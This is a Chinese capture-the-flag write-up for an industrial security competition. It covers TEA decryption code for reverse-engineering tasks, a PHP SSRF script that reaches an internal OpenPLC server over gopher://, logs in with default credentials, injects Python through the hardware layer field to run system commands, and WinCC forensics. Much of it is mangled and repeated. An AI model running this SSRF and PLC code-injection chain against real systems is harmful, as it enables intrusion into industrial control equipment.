# 2021年工业信息安全技能大赛-线上第二场WriteUp

> 原文: https://www.ctfiot.com/1512.html
> ID: 1512

v2 = 3v5 = 70v8 = -1

v1 = 30v2 = 3v3 = 10v3 + v11 = v5 = 70!!! v11 = 60
v8 = -1
v1 = 30v6 =v1 * v6 = v7
v7 + v8 = v9 = v10 = v12 = v1130 * v6 -1 = v9 = -61

#include <stdio.h> #include <stdint.h> //解密函数 void decrypt (uint32_t* v, uint32_t* k) { uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i; /* set up */ uint32_t delta=0x9e3779b9; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i<32; i++) { /* basic cycle start */ v1 -= ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3); v0 -= ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1); sum -= delta; } /* end cycle */ v[0]=v0; v[1]=v1; }
int main() { uint32_t r[8] = {}; int i; for (i = 0; i < 8; i+=2) { uint32_t v[2]= {r[i], r[i+1]},k[4]={}; // v为要加密的数据是两个32位无符号整数 // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位 decrypt(v, k); printf("%x%x",v[0],v[1]); } return 0; }

#include<stdio.h>#include<stdlib.h>#include<string.h>#include<time.h>

//解密函数 void decrypt (unsigned int* v, unsigned int* k) { unsigned int v0=v[0], v1=v[1], sum=0x62F35080, i; /* set up */ unsigned int delta=0x458BCD42; /* a key schedule constant */ unsigned int k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i<64; i++) { /* basic cycle start */ v1 -= ((((v0<<6) + k2) ^ (v0 + sum + 20) ^ ((v0>>9) + k3))^0x10); v0 -= ((((v1<<6) + k0) ^ (v1 + sum + 11) ^ ((v1>>9) + k1))^0x20); sum -= delta; } /* end cycle */ v[0]=v0; v[1]=v1; }int main(){ char magic[0x32d5]; char tmp[16]; unsigned char png[4] = {0x89, 0x50, 0x4E, 0x47 };
 unsigned char tea_key[16] = {0x0D, 0x0E, 0x0A, 0x0D, 0x0B, 0x0E, 0x0E, 0x0F, 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF };zc FILE*fp=fopen("flag.png.enc","rb"); int rl=fread(magic,0x32d5,1,fp); printf("%dn",rl); fclose(fp); unsigned char key; int seed=1626940252; srand(seed); for(int i=0;i<0x32d5;i++){ key=(unsigned char)rand(); magic[i]^=key; } for(int k=0;k<0x32d5;k+=16){
 decrypt((unsigned int *)(magic+k),(unsigned int *)tea_key); } fp=fopen("flag.png","wb+"); fwrite(magic,0x32d5,1,fp); fclose(fp); return 0;}

127.0.0.1 localhost::1 localhost ip6-localhost ip6-loopbackfe00::0 ip6-localnetff00::0 ip6-mcastprefixff02::1 ip6-allnodesff02::2 ip6-allrouters172.16.237.2 956510a842ce // 这个是最外面的服务自己172.16.238.2 956510a842ce

SSRF扫端口，扫到http://172.16.238.99:
8080 访问发现是OpenPLC

gopher打OpenPLC RCE

在OpenPLC的hardware里可以注入自写脚本，直接选择Linux PSM写python代码就可以了

然后用gopher包一下发包就行了

<?php
$u = 'http://192.168.87.114/?url=';// 172.16.238.99:
8080/login$data = 'username=openplc&password=openplc';
$addr = "172.16.238.99:
8080";$headers = [];$headers[] = "POST /login HTTP/1.1";$headers[] = "Host: $addr";$headers[] = "Content-Type: application/x-www-form-urlencoded";$headers[] = "Content-Length: " . strlen($data);
$data = urlencode($data);$header = urlencode(implode("rn",$headers)."rnrn");$header = str_replace("+","%20",$header);
$ssrf = "gopher://$addr/_" . $header . $data;
$ssrf = $u .urlencode($ssrf);$r = file_get_contents($ssrf);preg_match_all("/Set-Cookie: session=(.+?); Expire/",$r,$m);
$cookie = "session=".$m[1][0];
$addr = "172.16.238.99:
8080";$headers = [];$headers[] = "GET /users HTTP/1.1";$headers[] = "Host: $addr";$headers[] = "Cookie: $cookie";$data = '';$header = urlencode(implode("rn",$headers)."rnrn");$header = str_replace("+","%20",$header);
$ssrf = "gopher://$addr/_" . $header;
echo $ssrf . "rn";$ssrf = $u .urlencode($ssrf);
echo $ssrf . "rnrn";$r = file_get_contents($ssrf);

POST /login HTTP/1.1HOST: 172.16.238.99:
8080Content-Type: application/x-www-form-urlencodedContent-Length: 33
username=openplc&password=openplc

2.上传自写脚本(POST /hardware)

POST /login HTTP/1.1HOST: 172.16.238.99:
8080Content-Type: application/x-www-form-urlencodedCookie: session=.eJw1j8tqwzAQRX-laN1F_MjG0IVBScEwEwRyxWgTWketrFqOcRJsT8i_1y10dTaXwz13cfwc3cWL4jre3LM4tidR3MXThygEcjNZWS8UYcaAwRo1Uazng1QJMrY27jYUqpa4zoh3TLz_xnDyyGUOstmA3nvQNIGhBKXKKQCjqVMwdt34jrjyxE1KsYorE_j16XIL_BYOupwppQz010IGckwho0CzlTag7qJ9VYuNVYsRcmL1Ih7r98GN8b13_fW_5nZx41-ROA-uH7pGPH4Ap_RSTQ.YQOUzA.GaKPU1K1cGJkslzOnjOXF7gbDpgContent-Length: 77
hardware_layer=psm_linux&custom_layer_code=hardware_layer=psm_linux&custom_layer_code=__import__(os).system('ls+-alh+/')

GET /compile-program?file=blank_program.st HTTP/1.1HOST: 172.16.238.99:
8080Cookie: session=.eJw1j8tqwzAQRX-laN1F_MjG0IVBScEwEwRyxWgTWketrFqOcRJsT8i_1y10dTaXwz13cfwc3cWL4jre3LM4tidR3MXThygEcjNZWS8UYcaAwRo1Uazng1QJMrY27jYUqpa4zoh3TLz_xnDyyGUOstmA3nvQNIGhBKXKKQCjqVMwdt34jrjyxE1KsYorE_j16XIL_BYOupwppQz010IGckwho0CzlTag7qJ9VYuNVYsRcmL1Ih7r98GN8b13_fW_5nZx41-ROA-uH7pGPH4Ap_RSTQ.YQOUzA.GaKPU1K1cGJkslzOnjOXF7gbDpg

GET /start_plc HTTP/1.1HOST: 172.16.238.99:
8080Cookie: session=.eJw1j8tqwzAQRX-laN1F_MjG0IVBScEwEwRyxWgTWketrFqOcRJsT8i_1y10dTaXwz13cfwc3cWL4jre3LM4tidR3MXThygEcjNZWS8UYcaAwRo1Uazng1QJMrY27jYUqpa4zoh3TLz_xnDyyGUOstmA3nvQNIGhBKXKKQCjqVMwdt34jrjyxE1KsYorE_j16XIL_BYOupwppQz010IGckwho0CzlTag7qJ9VYuNVYsRcmL1Ih7r98GN8b13_fW_5nZx41-ROA-uH7pGPH4Ap_RSTQ.YQOUzA.GaKPU1K1cGJkslzOnjOXF7gbDpg

GET /runtime_logs HTTP/1.1HOST: 172.16.238.99:
8080Cookie: session=.eJw1j8tqwzAQRX-laN1F_MjG0IVBScEwEwRyxWgTWketrFqOcRJsT8i_1y10dTaXwz13cfwc3cWL4jre3LM4tidR3MXThygEcjNZWS8UYcaAwRo1Uazng1QJMrY27jYUqpa4zoh3TLz_xnDyyGUOstmA3nvQNIGhBKXKKQCjqVMwdt34jrjyxE1KsYorE_j16XIL_BYOupwppQz010IGckwho0CzlTag7qJ9VYuNVYsRcmL1Ih7r98GN8b13_fW_5nZx41-ROA-uH7pGPH4Ap_RSTQ.YQOUzA.GaKPU1K1cGJkslzOnjOXF7gbDpg

mod traffic

发现beifen文件

发现7z文件头格式，少了377A

补齐7z头

解压发现是wincc项目文件，使用wincc打开

发现flag在组态文件后面

flag{SPwAvMx0z5jtP5gT}

end

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析+AI 长期招新

欢迎联系admin@chamd5.org


```
v2 = 3v5 = 70v8 = -1

v1 = 30v2 = 3v3 = 10v3 + v11 = v5 = 70!!! v11 = 60
v8 = -1
v1 = 30v6 =v1 * v6 = v7
v7 + v8 = v9 = v10 = v12 = v1130 * v6 -1 = v9 = -61
    #include <stdio.h> #include <stdint.h> //解密函数 void decrypt (uint32_t* v, uint32_t* k) { uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i; /* set up */ uint32_t delta=0x9e3779b9; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i<32; i++) { /* basic cycle start */ v1 -= ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3); v0 -= ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1); sum -= delta; } /* end cycle */ v[0]=v0; v[1]=v1; }
int main() { uint32_t r[8] = {}; int i; for (i = 0; i < 8; i+=2) { uint32_t v[2]= {r[i], r[i+1]},k[4]={}; // v为要加密的数据是两个32位无符号整数 // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位 decrypt(v, k); printf("%x%x",v[0],v[1]); } return 0; }
    #include<stdio.h>#include<stdlib.h>#include<string.h>#include<time.h>

//解密函数 void decrypt (unsigned int* v, unsigned int* k) { unsigned int v0=v[0], v1=v[1], sum=0x62F35080, i; /* set up */ unsigned int delta=0x458BCD42; /* a key schedule constant */ unsigned int k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i<64; i++) { /* basic cycle start */ v1 -= ((((v0<<6) + k2) ^ (v0 + sum + 20) ^ ((v0>>9) + k3))^0x10); v0 -= ((((v1<<6) + k0) ^ (v1 + sum + 11) ^ ((v1>>9) + k1))^0x20); sum -= delta; } /* end cycle */ v[0]=v0; v[1]=v1; }int main(){ char magic[0x32d5]; char tmp[16]; unsigned char png[4] = {0x89, 0x50, 0x4E, 0x47 };
 unsigned char tea_key[16] = {0x0D, 0x0E, 0x0A, 0x0D, 0x0B, 0x0E, 0x0E, 0x0F, 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF };zc FILE*fp=fopen("flag.png.enc","rb"); int rl=fread(magic,0x32d5,1,fp); printf("%dn",rl); fclose(fp); unsigned char key; int seed=1626940252; srand(seed); for(int i=0;i<0x32d5;i++){ key=(unsigned char)rand(); magic[i]^=key; } for(int k=0;k<0x32d5;k+=16){
 decrypt((unsigned int *)(magic+k),(unsigned int *)tea_key); } fp=fopen("flag.png","wb+"); fwrite(magic,0x32d5,1,fp); fclose(fp); return 0;}
127.0.0.1 localhost::1 localhost ip6-localhost ip6-loopbackfe00::0 ip6-localnetff00::0 ip6-mcastprefixff02::1 ip6-allnodesff02::2 ip6-allrouters172.16.237.2 956510a842ce // 这个是最外面的服务自己172.16.238.2 956510a842ce
<?php
$u = 'http://192.168.87.114/?url=';// 172.16.238.99:
8080/login$data = 'username=openplc&password=openplc';
$addr = "172.16.238.99:
8080";$headers = [];$headers[] = "POST /login HTTP/1.1";$headers[] = "Host: $addr";$headers[] = "Content-Type: application/x-www-form-urlencoded";$headers[] = "Content-Length: " . strlen($data);
$data = urlencode($data);$header = urlencode(implode("rn",$headers)."rnrn");$header = str_replace("+","%20",$header);
$ssrf = "gopher://$addr/_" . $header . $data;
$ssrf = $u .urlencode($ssrf);$r = file_get_contents($ssrf);preg_match_all("/Set-Cookie: session=(.+?); Expire/",$r,$m);
$cookie = "session=".$m[1][0];
$addr = "172.16.238.99:
8080";$headers = [];$headers[] = "GET /users HTTP/1.1";$headers[] = "Host: $addr";$headers[] = "Cookie: $cookie";$data = '';$header = urlencode(implode("rn",$headers)."rnrn");$header = str_replace("+","%20",$header);
$ssrf = "gopher://$addr/_" . $header;
echo $ssrf . "rn";$ssrf = $u .urlencode($ssrf);
echo $ssrf . "rnrn";$r = file_get_contents($ssrf);
POST /login HTTP/1.1HOST: 172.16.238.99:
8080Content-Type: application/x-www-form-urlencodedContent-Length: 33
username=openplc&password=openplc
POST /login HTTP/1.1HOST: 172.16.238.99:
8080Content-Type: application/x-www-form-urlencodedCookie: session=.eJw1j8tqwzAQRX-laN1F_MjG0IVBScEwEwRyxWgTWketrFqOcRJsT8i_1y10dTaXwz13cfwc3cWL4jre3LM4tidR3MXThygEcjNZWS8UYcaAwRo1Uazng1QJMrY27jYUqpa4zoh3TLz_xnDyyGUOstmA3nvQNIGhBKXKKQCjqVMwdt34jrjyxE1KsYorE_j16XIL_BYOupwppQz010IGckwho0CzlTag7qJ9VYuNVYsRcmL1Ih7r98GN8b13_fW_5nZx41-ROA-uH7pGPH4Ap_RSTQ.YQOUzA.GaKPU1K1cGJkslzOnjOXF7gbDpgContent-Length: 77
hardware_layer=psm_linux&custom_layer_code=hardware_layer=psm_linux&custom_layer_code=__import__(os).system('ls+-alh+/')
GET /compile-program?file=blank_program.st HTTP/1.1HOST: 172.16.238.99:
8080Cookie: session=.eJw1j8tqwzAQRX-laN1F_MjG0IVBScEwEwRyxWgTWketrFqOcRJsT8i_1y10dTaXwz13cfwc3cWL4jre3LM4tidR3MXThygEcjNZWS8UYcaAwRo1Uazng1QJMrY27jYUqpa4zoh3TLz_xnDyyGUOstmA3nvQNIGhBKXKKQCjqVMwdt34jrjyxE1KsYorE_j16XIL_BYOupwppQz010IGckwho0CzlTag7qJ9VYuNVYsRcmL1Ih7r98GN8b13_fW_5nZx41-ROA-uH7pGPH4Ap_RSTQ.YQOUzA.GaKPU1K1cGJkslzOnjOXF7gbDpg
GET /start_plc HTTP/1.1HOST: 172.16.238.99:
8080Cookie: session=.eJw1j8tqwzAQRX-laN1F_MjG0IVBScEwEwRyxWgTWketrFqOcRJsT8i_1y10dTaXwz13cfwc3cWL4jre3LM4tidR3MXThygEcjNZWS8UYcaAwRo1Uazng1QJMrY27jYUqpa4zoh3TLz_xnDyyGUOstmA3nvQNIGhBKXKKQCjqVMwdt34jrjyxE1KsYorE_j16XIL_BYOupwppQz010IGckwho0CzlTag7qJ9VYuNVYsRcmL1Ih7r98GN8b13_fW_5nZx41-ROA-uH7pGPH4Ap_RSTQ.YQOUzA.GaKPU1K1cGJkslzOnjOXF7gbDpg
GET /runtime_logs HTTP/1.1HOST: 172.16.238.99:
8080Cookie: session=.eJw1j8tqwzAQRX-laN1F_MjG0IVBScEwEwRyxWgTWketrFqOcRJsT8i_1y10dTaXwz13cfwc3cWL4jre3LM4tidR3MXThygEcjNZWS8UYcaAwRo1Uazng1QJMrY27jYUqpa4zoh3TLz_xnDyyGUOstmA3nvQNIGhBKXKKQCjqVMwdt34jrjyxE1KsYorE_j16XIL_BYOupwppQz010IGckwho0CzlTag7qJ9VYuNVYsRcmL1Ih7r98GN8b13_fW_5nZx41-ROA-uH7pGPH4Ap_RSTQ.YQOUzA.GaKPU1K1cGJkslzOnjOXF7gbDpg
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/0-1634876315.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/9-1634876315.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/1-1634876315.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/9-1634876315.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/2-1634876316.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/0-1634876316.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/2-1634876316.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/7-1634876316.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/10-1634876316.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/0-1634876317.png)